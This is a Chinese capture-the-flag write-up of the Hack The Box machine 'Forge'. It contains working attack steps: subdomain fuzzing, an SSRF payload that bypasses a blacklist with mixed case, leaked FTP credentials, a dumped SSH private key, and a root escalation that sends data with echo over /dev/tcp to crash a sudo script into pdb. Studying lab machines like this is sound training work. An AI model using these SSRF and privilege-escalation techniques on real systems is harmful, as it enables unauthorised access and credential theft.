nmap扫描结果

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201151941616.png)

把`10.10.11.111 forge.htb`加到`/etc/hosts`

---

没扫描出啥东西...

上传分为本地文件上传和URL上传,URL限制了协议为`http`和`https`,测试时出现报错,可能为python服务器,URL上传处可以进行SSRF

```python
An error occured! Error : HTTPConnectionPool(host='forge.htbetc', port=80): Max retries exceeded with url: /passwd (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f6398df0a90>: Failed to establish a new connection: [Errno -3] Temporary failure in name resolution'))
```

一开始以为是subshell,检测后发现不对...

```
url=http://10.10.16.29:8888/`whoami`&remote=1
10.10.11.111 - - [15/Jan/2022 20:03:50] "GET /%60whoami%60 HTTP/1.1" 404 -
```

用gobuster扫描,返回了一堆302的结果

`./gobuster vhost -u http://forge.htb -w /mnt/hgfs/Exploits/subdomains-top1million-110000.txt -t 100`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201152018237.png)

换成`wfuzz`,安装前要注意安装`python3-pycurl`

`wfuzz -c -u "http://forge.htb/" -H "Host:FUZZ.forge.htb" -w /mnt/hgfs/Exploits/subdomains-top1million-110000.txt --hc 302`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201152042034.png)

好像不能直接访问

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201152045477.png)

尝试用URL上传去SSRF,发现存在黑名单过滤,尝试大小写绕过

`http://adMin.fOrge.hTb/`成功进行SSRF

```html

<!DOCTYPE html>
<html>
<head>
    <title>Admin Portal</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br><br>
    <br><br><br><br>
    <center><h1>Welcome Admins!</h1></center>
</body>
</html>
```

```html

<!DOCTYPE html>
<html>
<head>
    <title>Announcements</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <link rel="stylesheet" type="text/css" href="/static/css/announcements.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br>
    <ul>
        <li>An internal ftp server has been setup with credentials as user:heightofsecurity123!</li>
        <li>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.</li>
        <li>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&lt;url&gt;.</li>
    </ul>
</body>
</html>
```

```html

<!DOCTYPE html>
<html>
<head>
    <title>Upload an image</title>
</head>
<body onload="show_upload_local_file()">
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <link rel="stylesheet" type="text/css" href="/static/css/upload.css">
    <script type="text/javascript" src="/static/js/main.js"></script>
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <center>
        <br><br>
        <div id="content">
            <h2 onclick="show_upload_local_file()">
                Upload local file
            </h2>
            <h2 onclick="show_upload_remote_file()">
                Upload from url
            </h2>
            <div id="form-div">
                
            </div>
        </div>
    </center>
    <br>
    <br>
</body>
</html>
```

注意到ftp用户名和密码`user:heightofsecurity123!`,同时支持新的协议`ftp, ftps, http and https protocols for uploading from url`

```
url=http://admIn.Forge.Htb/upload?u=http://10.10.16.29:8888/&remote=1
10.10.11.111 - - [15/Jan/2022 20:58:02] "GET / HTTP/1.1" 200 -
```

利用得到的ftp用户名列出ftp中的内容,并获得`user flag`

```
url=http://admIn.Forge.Htb/upload?u=ftp://user:heightofsecurity123!@admIn.Forge.Htb&remote=1

drwxr-xr-x    3 1000     1000         4096 Aug 04 19:23 snap
-rw-r-----    1 0        1000           33 Jan 14 06:00 user.txt
```

没思路了qwq,看了眼wp说有`user.txt`则说明在用户目录下,那么可以尝试对用户的敏感文件进行读取,如`.bash_history`,`.ssh`等

验证发现`.bash_history`是空的,`.config`也是空的,`.ssh`中存在`authorized_keys`

```
-rw-------    1 1000     1000         1139 Jan 14 15:19 authorized_keys
-rw-------    1 1000     1000         2590 May 20  2021 id_rsa
-rw-------    1 1000     1000          564 May 20  2021 id_rsa.pub
```

```
authorized_keys

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCdkg75DLB+Cd+2qjlqz6isdb/DVZusbqLoHtO/Y91DT02LE6a0dHeufEei6/j+XWk7aeM9/kZuNUcCwzAkNeYM2Nqpl8705gLsruGvsVXrGVRZOHBwqjSEg5W4TsmHV36N+kNhheo43mvoPM4MjlYzAsqX2fmtu0WSjfFot7CQdhMTZhje69WmnGycK8n/q6SvqntvNxHKBitPIQBaDmA5F+yqELcdqg7FeJeAbNNbJe1/ajjOY2Gy192BZYGkR9uAWBncNYn67bP9U5unQggoR+yBf5xZdBS3xEkCcqBNSMYCZ81Ev2cnGiZgeXJJDPbEvhRhdfNevwaYvpfT6cqtGCVo0V0LTKQtMayIazX5tzqMmIPURKJ5sBL9ksBNOxofjogT++/1c4nTmoRdEZTP5qmXMMbjBa+JI256sPL09MbEHqRHmkZsJoRahE8tUhv0SqdaHbv2Ze7RvjNiESD6fIMrq6L+euZFhQ5p2AIpdHvOUSbeaCPiG7hwVqwf8qU= user@forge

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDd2/ldqQ3RjSOvROh65fIO+Qoc6iN8L3FBpr/Q13Ka+GFhVPjVQkN8S6LD9ndaejOq4FnWZ1Lo3vgPe5BigP9PU5oG9yCNz2k/jUArEVOq8Gqcgq3FHU+7DbD40u6FeXMLxKvynN+T38QciIlbfEvyAd++W337smi8+xPTVQWt92665+ADWkI3YGFtYP/ZDwCAhov4DSPLS5pxCMf/xk+KZDcPpILh3lJxIUTgqrzkA4j2GcAr7AVw8yILTf4B8LaIC+kmAutDnNAyOkuRrG6GKUoflbRhinA2sagS7UcQh8Xgx1z9/dUzLOsjQLVXjPFsWN13+RNA1hcLVwJK6Ug2W/3/omtIW4ngsqv+QSQqX19aBl01dUhBoRMXC/kAF+4F7oxbr9lZG6MomL/HcM0jCt755VDTPFp3u513qLAGTmjWHQymW/m8m2Y/ymBzaskvAx6g/xRYH3ANVFj1MeYjWkwzJi07bMu7KZ+NiVZn7HmAT164l5n1ggrFbsw7Ff0= root@DESKTOP-R79THJ3
```

```
id_rsa

-----BEGIN OPENSSH PRIVATE KEY-----
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
shlLupso7WoS0AAAAKdXNlckBmb3JnZQE=
-----END OPENSSH PRIVATE KEY-----
```

```
id_rsa.pub

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCdkg75DLB+Cd+2qjlqz6isdb/DVZusbqLoHtO/Y91DT02LE6a0dHeufEei6/j+XWk7aeM9/kZuNUcCwzAkNeYM2Nqpl8705gLsruGvsVXrGVRZOHBwqjSEg5W4TsmHV36N+kNhheo43mvoPM4MjlYzAsqX2fmtu0WSjfFot7CQdhMTZhje69WmnGycK8n/q6SvqntvNxHKBitPIQBaDmA5F+yqELcdqg7FeJeAbNNbJe1/ajjOY2Gy192BZYGkR9uAWBncNYn67bP9U5unQggoR+yBf5xZdBS3xEkCcqBNSMYCZ81Ev2cnGiZgeXJJDPbEvhRhdfNevwaYvpfT6cqtGCVo0V0LTKQtMayIazX5tzqMmIPURKJ5sBL9ksBNOxofjogT++/1c4nTmoRdEZTP5qmXMMbjBa+JI256sPL09MbEHqRHmkZsJoRahE8tUhv0SqdaHbv2Ze7RvjNiESD6fIMrq6L+euZFhQ5p2AIpdHvOUSbeaCPiG7hwVqwf8qU= user@forge
```

成功连接ssh

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201152127659.png)

```
-bash-5.0$ find / -user root -perm -4000 -print 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/bin/bash
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/su
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/umount
/usr/bin/fusermount
/usr/bin/newgrp

-bash-5.0$ sudo -l
Matching Defaults entries for user on forge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on forge:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
```

```python
import socket
import random
import subprocess
import pdb

port = random.randint(1025, 65535)

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('127.0.0.1', port))
    sock.listen(1)
    print(f'Listening on localhost:{port}')
    (clientsock, addr) = sock.accept()
    clientsock.send(b'Enter the secret passsword: ')
    if clientsock.recv(1024).strip().decode() != 'secretadminpassword':
        clientsock.send(b'Wrong password!\n')
    else:
        clientsock.send(b'Welcome admin!\n')
        while True:
            clientsock.send(b'\nWhat do you wanna do: \n')
            clientsock.send(b'[1] View processes\n')
            clientsock.send(b'[2] View free memory\n')
            clientsock.send(b'[3] View listening sockets\n')
            clientsock.send(b'[4] Quit\n')
            option = int(clientsock.recv(1024).strip())
            if option == 1:
                clientsock.send(subprocess.getoutput('ps aux').encode())
            elif option == 2:
                clientsock.send(subprocess.getoutput('df').encode())
            elif option == 3:
                clientsock.send(subprocess.getoutput('ss -lnt').encode())
            elif option == 4:
                clientsock.send(b'Bye\n')
                break
except Exception as e:
    print(e)
    pdb.post_mortem(e.__traceback__)
finally:
    quit()
```

程序监听`42048`端口,此时向`42048`发送数据即可进入pdb,此时的pdb以root权限运行

`echo "123" > /dev/tcp/localhost/42048`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201152143367.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201152153655.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201152155999.png)